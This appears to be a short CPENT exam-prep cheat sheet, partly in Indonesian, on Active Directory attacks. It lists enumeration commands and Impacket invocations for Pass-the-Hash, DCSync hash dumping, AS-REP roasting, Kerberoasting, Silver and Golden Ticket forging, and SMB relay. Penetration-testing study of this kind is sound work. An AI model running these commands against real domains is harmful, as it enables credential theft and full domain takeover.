---
name: "Advanced Windows Attacks — PtH, DCSync & Kerberos"
description: "Windows exploitation techniques for CPENT including Pass-the-Hash, Overpass-the-Hash, DCSync, Kerberos attacks (AS-REP, Kerberoasting, Silver/Golden Ticket), SMB relay, and advanced AD enumeration with Impacket and PowerView."
tags: [windows, pass-the-hash, dcsync, kerberos, impacket, active-directory]
---

# Advanced Windows Attacks

## Enumeration Framework

```powershell
net view /domain
nltest /dclist:$DOMAIN
nltest /domain_trusts
net view \\$DC /all
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
Get-Process | Where-Object { $_.SessionId -ne 0 }
Get-WmiObject -Class Win32_Share
```

## Attack Vectors

**Pass-the-Hash (PtH):**
```bash
impacket-wmiexec DOMAIN/USER@TARGET -hashes LMHASH:NTHASH
```

**Overpass-the-Hash**: Konversi NTLM hash ke TGT Kerberos.

**DCSync:**
```bash
impacket-secretsdump DOMAIN/USER:PASS@$DC
```

**Kerberos Attacks:**
```bash
# AS-REP Roasting
impacket-GetNPUsers DOMAIN/USER:PASS -request

# Kerberoasting
impacket-GetUserSPNs DOMAIN/USER:PASS -request

# Silver Ticket
impacket-ticketer -nthash $HASH -domain-sid $SID -domain DOMAIN -spn cifs/TARGET Administrator

# Golden Ticket
impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $SID -domain DOMAIN Administrator
```

**SMB Relay:**
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```

## Best Practices

- CPENT AD attacks tidak berbeda jauh dari OSCP tapi skalanya lebih besar
- Multiple domain dan forest trust adalah skenario umum
- Prioritaskan BloodHound untuk mapping attack paths
- DCSync adalah end-game untuk domain dominance
